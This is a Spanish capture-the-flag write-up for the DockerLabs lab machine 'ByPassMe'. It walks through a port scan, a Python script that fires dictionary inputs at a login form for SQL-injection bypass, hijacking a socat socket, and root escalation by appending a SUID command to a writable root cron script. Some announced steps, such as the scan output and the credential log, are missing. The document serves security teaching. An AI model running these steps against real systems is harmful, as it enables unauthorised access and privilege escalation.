## Introducción

Este documento presenta la resolución completa de la máquina **ByPassMe**, desarrollada por *RSA* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, permitiendo el bypass de autenticación. Tras acceder al panel, se encuentra un archivo de logs que contiene credenciales en texto plano del usuario `albert`, permitiendo el acceso SSH al sistema.
Una vez dentro, se identifican procesos y configuraciones inseguras: un socket UNIX de `socat` permite moverse al usuario `conx`, y una tarea cron ejecutada por `root` utiliza un script escribible por usuarios comunes, facilitando la escalada de privilegios mediante la inyección de comandos maliciosos para obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip ByPassMe.zip
sudo bash auto_deploy.sh ByPassMe.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p ByPassMe/{content,exploits,nmap,scripts}
cd ByPassMe
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Bypass de autenticación

El nombre de la máquina, "ByPassMe", sugiere que la vulnerabilidad está relacionada con un bypass de login, probablemente mediante una **inyección SQL (SQLi)**.

Se desarrolla un script en Python para automatizar pruebas de inyección en el campo `password`:

```python
import requests

def brute_force_password(password_list):
    burp0_url = "http://172.17.0.2:80/login.php"
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "Accept": "text/html,application/xhtml+xml"
    }

    for password in password_list:
        burp0_data = {"username": "test", "password": password.strip()}

        try:
            response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
            print(f"Probando: {password.strip()} - Status: {response.status_code} - Longitud: {len(response.content)}")

            if any(word in response.text for word in ["Bienvenido", "Dashboard", "logout"]):
                print(f"[+] CONTRASEÑA ENCONTRADA: {password}")
                return password

        except Exception as e:
            print(f"Error con {password}: {e}")

    print("[-] Contraseña no encontrada")
    return None

with open('dictionary.txt', 'r') as f:
    passwords = f.readlines()

brute_force_password(passwords)
```

Se captura una **cookie de sesión válida** que permite acceder al panel, logrando el **bypass del login**:

## Paso 3 — Escalada de privilegios

### 3.1 De albert → conx

Una vez dentro del sistema como `albert`, se enumeran procesos y configuraciones. Con el comando `ps aux`, se observa un proceso **socat** escuchando conexiones locales:

![Ps aux](https://res.cloudinary.com/dewqswzke/image/upload/v1761115748/PsAux_cdsvu8.png)

Se aprovecha esto para conectarse al socket UNIX del usuario `conx`:

```bash
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

La conexión otorga una nueva sesión como el usuario `conx`:

![User conx](https://res.cloudinary.com/dewqswzke/image/upload/v1761115747/Conx_hgjglb.png)

### 3.2 De conx → root

Se repite la enumeración con `ps aux` y se detecta un **proceso cron** ejecutado por `root`:

![Ps cron](https://res.cloudinary.com/dewqswzke/image/upload/v1761115748/PsCron_kxc15z.png)

Se listan las tareas programadas en `/etc/cron.d/`:

```bash
ls -la /etc/cron.d/
```

Se identifica un archivo llamado `backup-cron` con el siguiente contenido:

```
* * * * * root bash /var/backups/backup.sh
```

Este cron ejecuta un script **editable por usuarios comunes**, lo que constituye una grave vulnerabilidad. Se modifica para escalar privilegios:

```bash
echo "chmod u+s /bin/bash" >> /var/backups/backup.sh
```

Tras esperar un minuto, el cron ejecuta el cambio. Se obtiene una shell privilegiada con:

```bash
bash -p
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761115749/Root_awpylm.png)
